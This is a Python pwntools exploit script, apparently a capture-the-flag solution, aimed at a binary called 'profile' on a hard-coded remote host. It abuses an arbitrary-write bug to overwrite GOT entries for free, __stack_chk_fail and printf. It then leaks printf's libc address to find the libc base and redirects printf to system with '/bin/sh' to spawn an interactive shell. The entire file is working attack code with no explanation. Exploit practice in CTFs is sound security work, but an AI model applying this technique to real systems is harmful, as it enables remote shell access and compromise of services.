#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
import struct

context.update(arch="amd64", os="linux")
context.log_level = 'info'

exe = ELF("profile")
libc = ELF("./libc.so.6")

# shortcuts
def logbase(): log.info("libc base = %#x" % libc.address)
def logleak(name, val):  log.info(name+" = %#x" % val)
def sa(delim,data): return p.sendafter(delim,data)
def sla(delim,line): return p.sendlineafter(delim,line)
def sl(line): return p.sendline(line)
def rcu(d1, d2=0):
  p.recvuntil(d1, drop=True)
  # return data between d1 and d2
  if (d2):
    return p.recvuntil(d2,drop=True)


rop = ROP(exe)

host, port = "54.78.163.105","32638"

if args.REMOTE:
  p = remote(host,port)
else:
  p = process([exe.path])

def arb_write(addr, data):
  p.sendlineafter (b": ", str(((addr) << 32) | 1337))
  p.sendlineafter (b": ", data)

arb_write(exe.got[b'free'], p64(exe.sym[b'main'])[:3])
p.recvuntil("1337")
arb_write(exe.got[b'__stack_chk_fail'], p64(0x101)[:3])
p.recvuntil("1337")
arb_write(exe.got[b'printf'], p64(0x401050) + p64(0x401060))
p.recvuntil("Name: ")
printf_libc = u64(p.recv(6)+b"\x00\x00")
print("libc = "+ hex(printf_libc))
libc.address = printf_libc - 0x60770
print('libc base = '+hex(libc.address))
arb_write(exe.got[b'printf'] - 8, b"/bin/sh\x00"+p64(libc.sym['system'])*2)

p.interactive()


